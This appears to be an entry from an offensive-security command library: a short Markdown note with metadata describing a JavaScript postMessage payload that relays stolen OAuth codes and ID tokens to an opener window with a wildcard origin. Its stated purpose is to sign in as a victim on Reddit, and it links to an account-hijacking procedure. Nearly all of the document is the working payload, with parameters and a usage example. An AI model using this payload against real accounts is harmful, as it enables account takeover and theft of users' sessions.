---
data: >-
  opener.postMessage('{method:"oauthDone",data:{authorization:{code:code,id_token:id_token,state:state}}}',"*");
tags:
  - oauth
  - postmessage
type: command
executor: javascript
platforms:
  - Web
id: aece2bee-3067-4230-8f93-88a5cfca7e66
created_at: '2025-12-11T06:10:22.338Z'
updated_at: '2025-12-11T06:10:22.338Z'
verified: false
validated: true
submitted: true
---
# postmessage-oauthdone

## Command

```javascript
opener.postMessage('{method:"oauthDone",data:{authorization:{code:code,id_token:id_token,state:state}}}',"*");
```

## Description

Sends the stolen OAuth payload to the opener window to complete the sign-in process as the victim.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `method` | oauthDone - Indicates OAuth completion | Yes |
| `data` | Contains authorization object with code, id_token, state | Yes |

## Examples

### Basic Usage

```javascript
opener.postMessage('{method:"oauthDone",data:{authorization:{code:"xxx",id_token:"yyy",state:"zzz"}}}',"*");
```

## Expected Output

Successful sign-in as the victim on Reddit.

## Related

- [[procedures/Hijack-Account-with-Stolen-Tokens]]
